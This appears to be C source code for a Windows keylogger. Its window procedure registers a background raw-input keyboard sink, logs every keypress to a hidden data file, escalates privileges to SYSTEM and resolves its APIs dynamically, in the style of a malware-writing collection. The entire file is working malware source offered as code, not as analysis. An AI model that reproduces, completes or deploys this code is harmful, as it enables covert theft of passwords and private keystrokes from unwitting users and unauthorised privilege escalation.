#include "VxHeader.h"

LRESULT CALLBACK WndProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	RAWINPUTDEVICE Rid;
	RAWINPUT *Ri;
	UINT dwSize;
	static HANDLE hLog = INVALID_HANDLE_VALUE;
	static API_TABLE Api;
	static HDEVNOTIFY hDevice;
	static LPVOID Strings = NULL;
	static PPEB pPeb;
	static HANDLE hSystem;

	switch (Message)
	{
		case WM_CREATE:
		{
			pPeb = RtlGetPeb();
			break;
		}
		case WM_INPUT:
		{			
			GetRawInputData((HRAWINPUT)lParam, RID_INPUT, Ri, &dwSize, sizeof(RAWINPUTHEADER));

			Ri = (PRAWINPUT)Api.RtlAllocateHeap(pPeb->ProcessHeap, HEAP_ZERO_MEMORY, (SIZE_T)dwSize);
			if (Ri == NULL)
				return -1;

			if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, Ri, &dwSize, sizeof(RAWINPUTHEADER)))
			{
				if (Ri->header.dwType == RIM_TYPEKEYBOARD && Ri->data.keyboard.Message == WM_KEYDOWN)
				{
					if (!VxLogInput(&Api, hLog, Ri->data.keyboard.VKey))
						Api.vxDestroyWindow(hWnd); //make position independent... whoops
				}
			}

			Api.RtlFreeHeap(pPeb->ProcessHeap, HEAP_ZERO_MEMORY, Ri);

			break;
		}
		case WM_DESTROY:
		{
			if (hLog != INVALID_HANDLE_VALUE)
				Api.NtClose(hLog);

			break;
		}

		case WM_PASS_STRUCTURE:
		{
			VxCopyMemory(&Api, (PAPI_TABLE)lParam, sizeof(Api));

			Rid.usUsage = 0x06;
			Rid.usUsagePage = 0x01;
			Rid.hwndTarget = hWnd;
			Rid.dwFlags = RIDEV_INPUTSINK;

			//escalate to system....
			VxEscalateToSystemEx(&Api);

			if (hLog == INVALID_HANDLE_VALUE)
			{
				hLog = VxCreateDataFile(&Api);
				if (hLog == NULL)
					return -1;
			}

			if (!Api.RegisterRawInputDevices(&Rid, 0x01, sizeof(RAWINPUTDEVICE)))
				return -1;
			else
				break;
		}

		default:
		{
			if(Api.vxDefWindowProcW == NULL)
				return DefWindowProcW(hWnd, Message, wParam, lParam); //find solution later...
			else
				return Api.vxDefWindowProcW(hWnd, Message, wParam, lParam);
		}
	}

	return ERROR_SUCCESS;
}